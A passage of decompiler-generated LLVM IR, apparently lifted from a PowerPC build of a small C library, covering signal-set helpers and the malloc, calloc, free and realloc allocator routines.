  %v0_1000c264 = call i32 @__sigaddset()
  store i32 %v0_1000c264, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c26c

dec_label_pc_1000c26c:                            ; preds = %dec_label_pc_1000c250, %dec_label_pc_1000c264
  %v0_1000c270 = phi i32 [ %v0_1000c270.pre, %dec_label_pc_1000c250 ], [ %v0_1000c264, %dec_label_pc_1000c264 ]
  ret i32 %v0_1000c270

; uselistorder directives
  uselistorder label %dec_label_pc_1000c26c, { 1, 0 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000c2b0, label %dec_label_pc_1000c29c

dec_label_pc_1000c29c:                            ; preds = %entry
  %v0_1000c29c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c2a8 = inttoptr i32 %v0_1000c29c to i32*
  store i32 22, i32* %v2_1000c2a8, align 4
  %v0_1000c2bc.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2b8

dec_label_pc_1000c2b0:                            ; preds = %entry
  %v0_1000c2b0 = call i32 @__sigdelset()
  store i32 %v0_1000c2b0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c2b8

dec_label_pc_1000c2b8:                            ; preds = %dec_label_pc_1000c29c, %dec_label_pc_1000c2b0
  %v0_1000c2bc = phi i32 [ %v0_1000c2bc.pre, %dec_label_pc_1000c29c ], [ %v0_1000c2b0, %dec_label_pc_1000c2b0 ]
  ret i32 %v0_1000c2bc

; uselistorder directives
  uselistorder label %dec_label_pc_1000c2b8, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268485348, i32* @lr, align 4
  %v3_1000c2e0 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268485392, i32* @lr, align 4
  %v3_1000c30c = call i32 @__GI_memset(i32 255, i32 128, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000c354, label %dec_label_pc_1000c340

dec_label_pc_1000c340:                            ; preds = %entry
  %v0_1000c340 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000c34c = inttoptr i32 %v0_1000c340 to i32*
  store i32 22, i32* %v2_1000c34c, align 4
  %v0_1000c360.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c35c

dec_label_pc_1000c354:                            ; preds = %entry
  %v0_1000c354 = call i32 @__sigismember()
  store i32 %v0_1000c354, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c35c

dec_label_pc_1000c35c:                            ; preds = %dec_label_pc_1000c340, %dec_label_pc_1000c354
  %v0_1000c360 = phi i32 [ %v0_1000c360.pre, %dec_label_pc_1000c340 ], [ %v0_1000c354, %dec_label_pc_1000c354 ]
  ret i32 %v0_1000c360

; uselistorder directives
  uselistorder label %dec_label_pc_1000c35c, { 1, 0 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %v0_1000c370 = load i32, i32* @r4, align 4
  %v3_1000c370 = icmp eq i32 %v0_1000c370, 0
  %v0_1000c37c = load i32, i32* @r3, align 4
  %v0_1000c384 = load i32, i32* @r31, align 4
  store i32 %v0_1000c37c, i32* @r31, align 4
  br i1 %v3_1000c370, label %dec_label_pc_1000c3a8, label %dec_label_pc_1000c398

dec_label_pc_1000c398:                            ; preds = %entry
  %v1_1000c37c = add i32 %v0_1000c37c, 452
  store i32 ptrtoint (i32* @global_var_1000c39c.326 to i32), i32* @lr, align 4
  %v3_1000c398 = call i32 @__GI_sigprocmask(i32 0, i32 0, i32 %v1_1000c37c)
  %v3_1000c3a0 = icmp eq i32 %v3_1000c398, 0
  br i1 %v3_1000c3a0, label %dec_label_pc_1000c3ac, label %dec_label_pc_1000c3a8

dec_label_pc_1000c3a8:                            ; preds = %dec_label_pc_1000c398, %entry
  br label %dec_label_pc_1000c3ac

dec_label_pc_1000c3ac:                            ; preds = %dec_label_pc_1000c398, %dec_label_pc_1000c3a8
  %v0_1000c3ac = phi i32 [ 1, %dec_label_pc_1000c398 ], [ 0, %dec_label_pc_1000c3a8 ]
  %v1_1000c3ac = load i32, i32* @r31, align 4
  %v2_1000c3ac = add i32 %v1_1000c3ac, 448
  %v3_1000c3ac = inttoptr i32 %v2_1000c3ac to i32*
  store i32 %v0_1000c3ac, i32* %v3_1000c3ac, align 4
  store i32 %v0_1000c384, i32* @r31, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000c37c, { 1, 0 }
  uselistorder i32 448, { 2, 0, 1 }
  uselistorder i32 452, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c3ac, { 1, 0 }
}

define i32 @__sigismember() local_unnamed_addr {
entry:
  %v0_1000c3c8 = load i32, i32* @r4, align 4
  %v1_1000c3c8 = add i32 %v0_1000c3c8, -1
  %v1_1000c3cc = call i32 @__asm_rlwinm(i32 %v1_1000c3c8, i32 29, i32 3, i32 29)
  %v1_1000c3d0 = urem i32 %v1_1000c3c8, 32
  %v0_1000c3d4 = load i32, i32* @r3, align 4
  %v2_1000c3d4 = add i32 %v0_1000c3d4, %v1_1000c3cc
  %v3_1000c3d4 = inttoptr i32 %v2_1000c3d4 to i32*
  %v4_1000c3d4 = load i32, i32* %v3_1000c3d4, align 4
  %v3_1000c3dc = shl i32 1, %v1_1000c3d0
  %v2_1000c3e0 = and i32 %v4_1000c3d4, %v3_1000c3dc
  %v2_1000c3e4 = icmp ne i32 %v2_1000c3e0, 0
  %v5_1000c3e8 = zext i1 %v2_1000c3e4 to i32
  ret i32 %v5_1000c3e8
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000c3f0 = load i32, i32* @r4, align 4
  %v1_1000c3f0 = add i32 %v0_1000c3f0, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000c3f8 = call i32 @__asm_rlwinm(i32 %v1_1000c3f0, i32 29, i32 3, i32 29)
  store i32 %v1_1000c3f8, i32* @r11, align 4
  %v1_1000c3fc = urem i32 %v1_1000c3f0, 32
  %v1_1000c400 = load i32, i32* @r3, align 4
  %v2_1000c400 = add i32 %v1_1000c400, %v1_1000c3f8
  %v3_1000c400 = inttoptr i32 %v2_1000c400 to i32*
  %v4_1000c400 = load i32, i32* %v3_1000c400, align 4
  %v0_1000c404 = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c404 = shl i32 %v0_1000c404, %v1_1000c3fc
  store i32 %v3_1000c404, i32* %r0.global-to-local, align 4
  %v2_1000c408 = or i32 %v3_1000c404, %v4_1000c400
  store i32 %v2_1000c408, i32* %v3_1000c400, align 4
  ret i32 0
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000c418 = load i32, i32* @r4, align 4
  %v1_1000c418 = add i32 %v0_1000c418, -1
  store i32 -2, i32* %r0.global-to-local, align 4
  %v1_1000c420 = call i32 @__asm_rlwinm(i32 %v1_1000c418, i32 29, i32 3, i32 29)
  store i32 %v1_1000c420, i32* @r11, align 4
  %v1_1000c424 = urem i32 %v1_1000c418, 32
  %v1_1000c428 = load i32, i32* @r3, align 4
  %v2_1000c428 = add i32 %v1_1000c428, %v1_1000c420
  %v3_1000c428 = inttoptr i32 %v2_1000c428 to i32*
  %v4_1000c428 = load i32, i32* %v3_1000c428, align 4
  %v0_1000c42c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000c42c = shl i32 %v0_1000c42c, %v1_1000c424
  %v4_1000c42c = sub nsw i32 32, %v1_1000c424
  %v5_1000c42c = lshr i32 %v0_1000c42c, %v4_1000c42c
  %v6_1000c42c = or i32 %v5_1000c42c, %v3_1000c42c
  store i32 %v6_1000c42c, i32* %r0.global-to-local, align 4
  %v2_1000c430 = and i32 %v6_1000c42c, %v4_1000c428
  store i32 %v2_1000c430, i32* %v3_1000c428, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000c440 = load i32, i32* @r3, align 4
  %v3_1000c440 = icmp eq i32 %v0_1000c440, 0
  br i1 %v3_1000c440, label %dec_label_pc_1000c458, label %dec_label_pc_1000c45c

dec_label_pc_1000c458:                            ; preds = %entry
  br label %dec_label_pc_1000c45c

dec_label_pc_1000c45c:                            ; preds = %entry, %dec_label_pc_1000c458
  %v0_1000c46c = phi i32 [ 1, %dec_label_pc_1000c458 ], [ %v0_1000c440, %entry ]
  %v3_1000c460 = icmp ugt i32 %v0_1000c46c, -8
  br i1 %v3_1000c460, label %dec_label_pc_1000c570, label %dec_label_pc_1000c468

dec_label_pc_1000c468:                            ; preds = %dec_label_pc_1000c45c
  %v1_1000c46c = add i32 %v0_1000c46c, 4
  store i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), i32* @r29, align 4
  store i32 %v1_1000c46c, i32* %stack_var_-40, align 4
  store i32 268485760, i32* @lr, align 4
  %v1_1000c47c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030b4c.114 to i32))
  %v2_1000c484 = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000c48c = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -15676) to i32*), i32 %v2_1000c484)
  store i32 %v3_1000c48c, i32* @r31, align 4
  %v0_1000c494 = load i32, i32* @r29, align 4
  store i32 %v0_1000c494, i32* @r3, align 4
  store i32 268485788, i32* @lr, align 4
  %v0_1000c498 = call i32 @pthread_mutex_unlock()
  %v0_1000c49c = load i32, i32* @r31, align 4
  %v3_1000c49c = icmp eq i32 %v0_1000c49c, 0
  br i1 %v3_1000c49c, label %dec_label_pc_1000c4a4, label %dec_label_pc_1000c554.thread

dec_label_pc_1000c554.thread:                     ; preds = %dec_label_pc_1000c468
  br label %dec_label_pc_1000c568

dec_label_pc_1000c4a4:                            ; preds = %dec_label_pc_1000c468
  %v3_1000c4a8 = load i32, i32* @global_var_1002c39c.149, align 4
  %v3_1000c4ac = load i32, i32* %stack_var_-40, align 4
  %v2_1000c4b0 = icmp ult i32 %v3_1000c4ac, %v3_1000c4a8
  br i1 %v2_1000c4b0, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c4b8

dec_label_pc_1000c4b8:                            ; preds = %dec_label_pc_1000c4a4
  %v2_1000c4b8 = add i32 %v3_1000c4a8, -1
  %v1_1000c4c0 = add i32 %v2_1000c4b8, %v3_1000c4ac
  br label %dec_label_pc_1000c4c8

dec_label_pc_1000c4c8:                            ; preds = %dec_label_pc_1000c4a4, %dec_label_pc_1000c4b8
  %storemerge = phi i32 [ %v1_1000c4c0, %dec_label_pc_1000c4b8 ], [ %v3_1000c4ac, %dec_label_pc_1000c4a4 ]
  store i32 %storemerge, i32* @r9, align 4
  store i32 268485848, i32* @lr, align 4
  %v1_1000c4d4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030c78.113 to i32))
  %v0_1000c4d8 = load i32, i32* @r31, align 4
  store i32 268485856, i32* @lr, align 4
  %v1_1000c4dc = call i32 @__GI_sbrk(i32 %v0_1000c4d8)
  %v3_1000c4e0 = icmp eq i32 %v1_1000c4dc, -1
  br i1 %v3_1000c4e0, label %dec_label_pc_1000c500, label %dec_label_pc_1000c4e8

dec_label_pc_1000c4e8:                            ; preds = %dec_label_pc_1000c4c8
  %v1_1000c4e8 = add i32 %v1_1000c4dc, 3
  %v1_1000c4ec = call i32 @__asm_rlwinm(i32 %v1_1000c4e8, i32 0, i32 0, i32 29)
  store i32 %v1_1000c4ec, i32* @r30, align 4
  %v4_1000c4f0 = icmp eq i32 %v1_1000c4ec, %v1_1000c4dc
  br i1 %v4_1000c4f0, label %dec_label_pc_1000c500, label %dec_label_pc_1000c4f8

dec_label_pc_1000c4f8:                            ; preds = %dec_label_pc_1000c4e8
  %v2_1000c4f8 = sub i32 %v1_1000c4ec, %v1_1000c4dc
  store i32 268485888, i32* @lr, align 4
  %v1_1000c4fc = call i32 @__GI_sbrk(i32 %v2_1000c4f8)
  br label %dec_label_pc_1000c500

dec_label_pc_1000c500:                            ; preds = %dec_label_pc_1000c4e8, %dec_label_pc_1000c4c8, %dec_label_pc_1000c4f8
  store i32 ptrtoint (i32* @global_var_10030c78.113 to i32), i32* @r3, align 4
  store i32 268485900, i32* @lr, align 4
  %v0_1000c508 = call i32 @pthread_mutex_unlock()
  %v0_1000c50c = load i32, i32* @r30, align 4
  %v3_1000c50c = icmp eq i32 %v0_1000c50c, -1
  br i1 %v3_1000c50c, label %dec_label_pc_1000c570, label %dec_label_pc_1000c554

dec_label_pc_1000c554:                            ; preds = %dec_label_pc_1000c500
  store i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002c2c4 to i32), i32* @r29, align 4
  store i32 268485932, i32* @lr, align 4
  %v1_1000c528 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030b4c.114 to i32))
  %v0_1000c52c = load i32, i32* @r31, align 4
  %v0_1000c530 = load i32, i32* @r30, align 4
  %v0_1000c534 = load i32, i32* @r29, align 4
  store i32 268485948, i32* @lr, align 4
  %v3_1000c538 = inttoptr i32 %v0_1000c534 to i32*
  %v4_1000c538 = call i32 @__heap_free(i32* %v3_1000c538, i32 %v0_1000c530, i32 %v0_1000c52c)
  %v0_1000c53c = load i32, i32* @r29, align 4
  %v2_1000c544 = inttoptr i32 %v0_1000c53c to i32*
  %v3_1000c544 = call i32 @__heap_alloc(i32* %v2_1000c544, i32 %v2_1000c484)
  store i32 %v3_1000c544, i32* @r31, align 4
  %v0_1000c54c = load i32, i32* @r28, align 4
  store i32 %v0_1000c54c, i32* @r3, align 4
  store i32 268485972, i32* @lr, align 4
  %v0_1000c550 = call i32 @pthread_mutex_unlock()
  %v0_1000c554.pre = load i32, i32* @r31, align 4
  %v3_1000c554 = icmp eq i32 %v0_1000c554.pre, 0
  br i1 %v3_1000c554, label %dec_label_pc_1000c568.thread, label %dec_label_pc_1000c568

dec_label_pc_1000c568.thread:                     ; preds = %dec_label_pc_1000c554
  br label %dec_label_pc_1000c570

dec_label_pc_1000c568:                            ; preds = %dec_label_pc_1000c554, %dec_label_pc_1000c554.thread
  %v0_1000c568.pr6 = phi i32 [ %v0_1000c49c, %dec_label_pc_1000c554.thread ], [ %v0_1000c554.pre, %dec_label_pc_1000c554 ]
  %v3_1000c55c = load i32, i32* %stack_var_-40, align 4
  %v2_1000c560 = inttoptr i32 %v0_1000c568.pr6 to i32*
  store i32 %v3_1000c55c, i32* %v2_1000c560, align 4
  %v0_1000c564 = load i32, i32* @r31, align 4
  %v1_1000c564 = add i32 %v0_1000c564, 4
  store i32 %v1_1000c564, i32* @r31, align 4
  %v3_1000c568 = icmp eq i32 %v1_1000c564, 0
  br i1 %v3_1000c568, label %dec_label_pc_1000c570, label %dec_label_pc_1000c580

dec_label_pc_1000c570:                            ; preds = %dec_label_pc_1000c568.thread, %dec_label_pc_1000c568, %dec_label_pc_1000c500, %dec_label_pc_1000c45c
  %v0_1000c570 = call i32 @__errno_location()
  %v2_1000c578 = inttoptr i32 %v0_1000c570 to i32*
  store i32 12, i32* %v2_1000c578, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000c580

dec_label_pc_1000c580:                            ; preds = %dec_label_pc_1000c568, %dec_label_pc_1000c570
  %v0_1000c584 = phi i32 [ %v1_1000c564, %dec_label_pc_1000c568 ], [ 0, %dec_label_pc_1000c570 ]
  ret i32 %v0_1000c584

; uselistorder directives
  uselistorder i32 %v1_1000c564, { 1, 0, 2 }
  uselistorder i32 %v0_1000c554.pre, { 1, 0 }
  uselistorder i32 %v1_1000c4ec, { 1, 0, 2 }
  uselistorder i32 %v1_1000c4dc, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000c580, { 1, 0 }
  uselistorder label %dec_label_pc_1000c570, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000c500, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c4c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c45c, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1000c598 = icmp eq i32 %arg1, 0
  %v2_1000c5a8 = mul i32 %arg2, %arg1
  store i32 %v2_1000c5a8, i32* @r31, align 4
  br i1 %v3_1000c598, label %dec_label_pc_1000c5d4, label %dec_label_pc_1000c5b4

dec_label_pc_1000c5b4:                            ; preds = %entry
  %v2_1000c5b4 = udiv i32 %v2_1000c5a8, %arg1
  store i32 0, i32* @r30, align 4
  %v4_1000c5bc = icmp eq i32 %v2_1000c5b4, %arg2
  br i1 %v4_1000c5bc, label %dec_label_pc_1000c5d4, label %dec_label_pc_1000c5c4

dec_label_pc_1000c5c4:                            ; preds = %dec_label_pc_1000c5b4
  %v0_1000c5c4 = call i32 @__errno_location()
  %v2_1000c5cc = inttoptr i32 %v0_1000c5c4 to i32*
  store i32 12, i32* %v2_1000c5cc, align 4
  br label %dec_label_pc_1000c5f0

dec_label_pc_1000c5d4:                            ; preds = %dec_label_pc_1000c5b4, %entry
  store i32 %v2_1000c5a8, i32* @r3, align 4
  store i32 268486108, i32* @lr, align 4
  %v0_1000c5d8 = call i32 @malloc()
  %v0_1000c5dc = load i32, i32* @r31, align 4
  store i32 %v0_1000c5d8, i32* @r30, align 4
  %v3_1000c5e0 = icmp eq i32 %v0_1000c5d8, 0
  br i1 %v3_1000c5e0, label %dec_label_pc_1000c5f0, label %dec_label_pc_1000c5ec

dec_label_pc_1000c5ec:                            ; preds = %dec_label_pc_1000c5d4
  store i32 268486128, i32* @lr, align 4
  %v3_1000c5ec = call i32 @__GI_memset(i32 0, i32 %v0_1000c5dc, i32 %v0_1000c5dc)
  br label %dec_label_pc_1000c5f0

dec_label_pc_1000c5f0:                            ; preds = %dec_label_pc_1000c5d4, %dec_label_pc_1000c5c4, %dec_label_pc_1000c5ec
  %v0_1000c5f4 = load i32, i32* @r30, align 4
  ret i32 %v0_1000c5f4

; uselistorder directives
  uselistorder i32 %v0_1000c5dc, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c5f0, { 2, 0, 1 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000c608 = load i32, i32* @r3, align 4
  %v3_1000c608 = icmp eq i32 %v0_1000c608, 0
  br i1 %v3_1000c608, label %dec_label_pc_1000c6f4, label %dec_label_pc_1000c620

dec_label_pc_1000c620:                            ; preds = %entry
  %v1_1000c624 = add i32 %v0_1000c608, -4
  %v2_1000c624 = inttoptr i32 %v1_1000c624 to i32*
  %v3_1000c624 = load i32, i32* %v2_1000c624, align 4
  store i32 %v3_1000c624, i32* @r28, align 4
  store i32 %v1_1000c624, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r26, align 4
  store i32 268486204, i32* @lr, align 4
  %v1_1000c638 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030b4c.114 to i32))
  %v0_1000c63c = load i32, i32* @r29, align 4
  %v0_1000c640 = load i32, i32* @r28, align 4
  store i32 268486220, i32* @lr, align 4
  %v4_1000c648 = call i32 @__heap_free(i32* nonnull @global_var_1002c2c4, i32 %v0_1000c63c, i32 %v0_1000c640)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_1000c650 = load i32, i32* @global_var_1002c39c.149, align 4
  store i32 %v4_1000c648, i32* @r29, align 4
  %v1_1000c658 = inttoptr i32 %v4_1000c648 to i32*
  %v2_1000c658 = load i32, i32* %v1_1000c658, align 4
  store i32 %v2_1000c658, i32* @r27, align 4
  %v1_1000c65c = mul i32 %v3_1000c650, 8
  %v2_1000c660 = icmp ult i32 %v2_1000c658, %v1_1000c65c
  br i1 %v2_1000c660, label %dec_label_pc_1000c694, label %dec_label_pc_1000c668

dec_label_pc_1000c668:                            ; preds = %dec_label_pc_1000c620
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_10030c78.113 to i32), i32* @r28, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c67c.331 to i32), i32* @lr, align 4
  %v1_1000c678 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030c78.113 to i32))
  store i32 268486276, i32* @lr, align 4
  %v1_1000c680 = call i32 @__GI_sbrk(i32 0)
  %v0_1000c684 = load i32, i32* @r31, align 4
  %v4_1000c684 = icmp eq i32 %v0_1000c684, %v1_1000c680
  br i1 %v4_1000c684, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c68c

dec_label_pc_1000c68c:                            ; preds = %dec_label_pc_1000c668
  %v0_1000c68c = load i32, i32* @r28, align 4
  store i32 %v0_1000c68c, i32* @r3, align 4
  store i32 268486292, i32* @lr, align 4
  %v0_1000c690 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1000c694

dec_label_pc_1000c694:                            ; preds = %dec_label_pc_1000c620, %dec_label_pc_1000c68c
  %v0_1000c694 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c6f0

dec_label_pc_1000c69c:                            ; preds = %dec_label_pc_1000c668
  %v0_1000c69c = load i32, i32* @r29, align 4
  %v1_1000c69c = add i32 %v0_1000c69c, 4
  %v2_1000c69c = inttoptr i32 %v1_1000c69c to i32*
  %v3_1000c69c = load i32, i32* %v2_1000c69c, align 4
  %v3_1000c6a0 = icmp eq i32 %v3_1000c69c, 0
  br i1 %v3_1000c6a0, label %dec_label_pc_1000c6b0, label %dec_label_pc_1000c6a8

dec_label_pc_1000c6a8:                            ; preds = %dec_label_pc_1000c69c
  %v1_1000c6a8 = add i32 %v0_1000c69c, 8
  %v2_1000c6a8 = inttoptr i32 %v1_1000c6a8 to i32*
  %v3_1000c6a8 = load i32, i32* %v2_1000c6a8, align 4
  %v2_1000c6ac = add i32 %v3_1000c69c, 8
  %v3_1000c6ac = inttoptr i32 %v2_1000c6ac to i32*
  store i32 %v3_1000c6a8, i32* %v3_1000c6ac, align 4
  %v0_1000c6b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c6b0

dec_label_pc_1000c6b0:                            ; preds = %dec_label_pc_1000c69c, %dec_label_pc_1000c6a8
  %v0_1000c6b0 = phi i32 [ %v0_1000c69c, %dec_label_pc_1000c69c ], [ %v0_1000c6b0.pre, %dec_label_pc_1000c6a8 ]
  %v1_1000c6b0 = add i32 %v0_1000c6b0, 8
  %v2_1000c6b0 = inttoptr i32 %v1_1000c6b0 to i32*
  %v3_1000c6b0 = load i32, i32* %v2_1000c6b0, align 4
  store i32 %v3_1000c6b0, i32* @r9, align 4
  %v1_1000c6b4 = add i32 %v0_1000c6b0, 4
  %v2_1000c6b4 = inttoptr i32 %v1_1000c6b4 to i32*
  %v3_1000c6b4 = load i32, i32* %v2_1000c6b4, align 4
  %v3_1000c6b8 = icmp eq i32 %v3_1000c6b0, 0
  br i1 %v3_1000c6b8, label %dec_label_pc_1000c6c8, label %dec_label_pc_1000c6c0

dec_label_pc_1000c6c0:                            ; preds = %dec_label_pc_1000c6b0
  %v2_1000c6c0 = add i32 %v3_1000c6b0, 4
  %v3_1000c6c0 = inttoptr i32 %v2_1000c6c0 to i32*
  store i32 %v3_1000c6b4, i32* %v3_1000c6c0, align 4
  br label %dec_label_pc_1000c6cc

dec_label_pc_1000c6c8:                            ; preds = %dec_label_pc_1000c6b0
  store i32 %v3_1000c6b4, i32* @global_var_1002c2c4, align 4
  br label %dec_label_pc_1000c6cc

dec_label_pc_1000c6cc:                            ; preds = %dec_label_pc_1000c6c0, %dec_label_pc_1000c6c8
  store i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), i32* @r3, align 4
  store i32 268486360, i32* @lr, align 4
  %v0_1000c6d4 = call i32 @pthread_mutex_unlock()
  %v0_1000c6d8 = load i32, i32* @r27, align 4
  %v1_1000c6d8 = load i32, i32* @r29, align 4
  %v0_1000c6e0 = load i32, i32* @r31, align 4
  %v2_1000c6d8 = sub i32 12, %v0_1000c6d8
  %v1_1000c6dc = add i32 %v2_1000c6d8, %v1_1000c6d8
  %v2_1000c6e0 = sub i32 %v1_1000c6dc, %v0_1000c6e0
  store i32 268486376, i32* @lr, align 4
  %v1_1000c6e4 = call i32 @__GI_sbrk(i32 %v2_1000c6e0)
  br label %dec_label_pc_1000c6f0

dec_label_pc_1000c6f0:                            ; preds = %dec_label_pc_1000c694, %dec_label_pc_1000c6cc
  %storemerge = phi i32 [ %v0_1000c694, %dec_label_pc_1000c694 ], [ ptrtoint (i32* @global_var_10030c78.113 to i32), %dec_label_pc_1000c6cc ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268486388, i32* @lr, align 4
  %v0_1000c6f0 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1000c6f4

dec_label_pc_1000c6f4:                            ; preds = %entry, %dec_label_pc_1000c6f0
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000c6f0, %dec_label_pc_1000c6f0 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000c6b0, { 1, 0 }
  uselistorder i32 undef, { 3, 5, 4, 2, 0, 1, 6, 7, 8, 9 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10030c78.113 to i32), { 0, 1, 4, 5, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000c6f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c694, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000c708 = load i32, i32* @r4, align 4
  %v3_1000c708 = icmp eq i32 %v0_1000c708, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000c708, label %dec_label_pc_1000c724, label %dec_label_pc_1000c730

dec_label_pc_1000c724:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000c728.332 to i32), i32* @lr, align 4
  %v0_1000c724 = call i32 @free()
  br label %dec_label_pc_1000c73c

dec_label_pc_1000c730:                            ; preds = %entry
  %v3_1000c730 = icmp eq i32 %arg1, 0
  br i1 %v3_1000c730, label %dec_label_pc_1000c73c, label %dec_label_pc_1000c748

dec_label_pc_1000c73c:                            ; preds = %dec_label_pc_1000c730, %dec_label_pc_1000c724
  %storemerge = phi i32 [ 0, %dec_label_pc_1000c724 ], [ %v0_1000c708, %dec_label_pc_1000c730 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268486464, i32* @lr, align 4
  %v0_1000c73c = call i32 @malloc()
  store i32 %v0_1000c73c, i32* @r28, align 4
  br label %dec_label_pc_1000c820

dec_label_pc_1000c748:                            ; preds = %dec_label_pc_1000c730
  %v1_1000c748 = add i32 %v0_1000c708, 7
  %v1_1000c74c = add i32 %arg1, -4
  store i32 %v1_1000c74c, i32* @r27, align 4
  %v1_1000c750 = call i32 @__asm_rlwinm(i32 %v1_1000c748, i32 0, i32 0, i32 29)
  store i32 %v1_1000c750, i32* @r31, align 4
  %v2_1000c754 = inttoptr i32 %v1_1000c74c to i32*
  %v3_1000c754 = load i32, i32* %v2_1000c754, align 4
  store i32 %v3_1000c754, i32* @r30, align 4
  %v2_1000c758 = icmp ugt i32 %v1_1000c750, 11
  br i1 %v2_1000c758, label %dec_label_pc_1000c764, label %dec_label_pc_1000c760

dec_label_pc_1000c760:                            ; preds = %dec_label_pc_1000c748
  store i32 12, i32* @r31, align 4
  br label %dec_label_pc_1000c764

dec_label_pc_1000c764:                            ; preds = %dec_label_pc_1000c748, %dec_label_pc_1000c760
  %v0_1000c7e4 = phi i32 [ %v1_1000c750, %dec_label_pc_1000c748 ], [ 12, %dec_label_pc_1000c760 ]
  %v3_1000c764 = icmp ugt i32 %v0_1000c7e4, %v3_1000c754
  br i1 %v3_1000c764, label %dec_label_pc_1000c76c, label %dec_label_pc_1000c7e4

dec_label_pc_1000c76c:                            ; preds = %dec_label_pc_1000c764
  store i32 ptrtoint (i32* @global_var_10030b4c.114 to i32), i32* @r29, align 4
  store i32 268486524, i32* @lr, align 4
  %v1_1000c778 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10030b4c.114 to i32))
  %v0_1000c780 = load i32, i32* @r27, align 4
  %v1_1000c780 = load i32, i32* @r30, align 4
  %v2_1000c780 = add i32 %v1_1000c780, %v0_1000c780
  %v1_1000c784 = load i32, i32* @r31, align 4
  %v2_1000c784 = sub i32 %v1_1000c784, %v1_1000c780
  %v4_1000c78c = call i32 @__heap_alloc_at(i32* nonnull @global_var_1002c2c4, i32 %v2_1000c780, i32 %v2_1000c784)
  store i32 %v4_1000c78c, i32* @r27, align 4
